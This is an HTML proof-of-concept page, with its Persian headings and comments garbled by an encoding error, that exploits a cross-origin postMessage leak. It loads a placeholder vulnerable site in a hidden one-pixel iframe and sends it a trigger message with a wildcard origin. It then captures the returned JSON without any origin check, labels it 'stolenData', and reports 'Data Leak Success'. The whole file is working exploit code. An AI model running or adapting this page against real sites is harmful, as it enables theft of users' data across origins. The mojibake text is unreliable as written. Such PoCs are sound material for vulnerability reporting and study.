<!DOCTYPE html>
<html>
<head>
    <title>PoC - Information Leakage via PostMessage</title>
</head>
<body>
    <h2>Ø§Ø«Ø¨Ø§Øª Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ Ù†Ø´Øª Ø§Ø·Ù„Ø§Ø¹Ø§Øª - Ù„Ø·ÙØ§ Ú©Ù†Ø³ÙˆÙ„ Ø±Ø§ Ú†Ú© Ú©Ù†ÛŒØ¯</h2>
    <p>Ø§Ú¯Ø± Ù¾ÛŒØ§Ù… JSON Ø¯Ø± Ú©Ù†Ø³ÙˆÙ„ Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯ØŒ Ù†Ø´Øª Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯Ù‡ Ø§Ø³Øª.</p>
    
    <iframe id="victimFrame" src="https://VULNERABLE-SITE.COM/path/to/vulnerable-page.html" style="width:1px; height:1px; border:none; visibility:hidden;"></iframe>

    <script>
        var victim = document.getElementById("victimFrame").contentWindow;

        // Ø´Ù†ÙˆØ¯ Ú©Ù†Ù†Ø¯Ù‡ Ø¨Ø±Ø§ÛŒ Ø¯Ø±ÛŒØ§ÙØª Ù‡Ø±Ú¯ÙˆÙ†Ù‡ Ù¾ÛŒØ§Ù… Ø§Ø±Ø³Ø§Ù„ÛŒ Ø§Ø² iFrame
        window.addEventListener("message", function(event) {
            
            console.log("--- Ù¾ÛŒØ§Ù… Ø¯Ø±ÛŒØ§ÙØªÛŒ (Captured Message) ---");
            console.log("Origin ÙØ±Ø³ØªÙ†Ø¯Ù‡:", event.origin);
            
            try {
                var stolenData = JSON.parse(event.data);
                
                // ğŸ’¥ Ø§ÛŒÙ† Ù‚Ø³Ù…Øª Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ Ù†Ø´Øª Ø´Ø¯Ù‡ (Ù…Ø§Ù†Ù†Ø¯ eventID) Ø±Ø§ Ù†Ù…Ø§ÛŒØ´ Ù…ÛŒâ€ŒØ¯Ù‡Ø¯ ğŸ’¥
                console.log("âœ… Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ Ø­Ø³Ø§Ø³ Ù†Ø´Øª Ø´Ø¯Ù‡:", stolenData);
                alert("Data Leak Success! Check Console for JSON Payload.");
                
            } catch (e) {
                console.warn("Received non-JSON data or unexpected format.");
            }
        });

        // Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… Ù…Ø§Ø´Ù‡â€ŒÚ©Ø´ (Trigger) Ø¨Ø±Ø§ÛŒ Ù…Ø¬Ø¨ÙˆØ± Ú©Ø±Ø¯Ù† iFrame Ø¨Ù‡ Ø§Ø±Ø³Ø§Ù„ Ù¾Ø§Ø³Ø®
        document.getElementById("victimFrame").onload = function() {
            console.log("Target loaded, sending trigger...");
            
            // Ø§ÛŒÙ† Payload Ø¯Ù‚ÛŒÙ‚Ø§Ù‹ Ù‡Ù…Ø§Ù† Ú†ÛŒØ²ÛŒ Ø§Ø³Øª Ú©Ù‡ Ú©Ø¯ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ± Ø§Ù†ØªØ¸Ø§Ø± Ø¯Ø§Ø±Ø¯
            var triggerPayload = JSON.stringify({ action: "Initialized" });
            
            // Ù¾ÛŒØ§Ù… Ø¨Ù‡ iFrame Ø§Ø±Ø³Ø§Ù„ Ù…ÛŒâ€ŒØ´ÙˆØ¯
            victim.postMessage(triggerPayload, "*"); 
            console.log("Trigger Payload sent.");
        };
    </script>
</body>
</html>
